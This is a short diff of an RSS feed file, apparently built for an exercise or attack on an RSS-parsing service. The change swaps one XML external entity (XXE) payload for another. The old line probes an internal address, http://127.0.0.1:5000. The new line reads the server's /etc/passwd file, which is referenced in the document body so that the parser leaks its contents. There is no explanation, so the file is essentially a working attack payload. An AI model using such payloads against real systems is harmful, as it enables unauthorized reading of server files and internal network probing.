@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <rss version="2.0">
     <channel>
-        <!DOCTYPE root [<!ENTITY xxe SYSTEM 'http://127.0.0.1:5000'> ]>
+        <!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'> ]>
         <root>&xxe;</root>
         <title>Nom de ton flux RSS</title>
         <link>https://tonsite.com/</link>
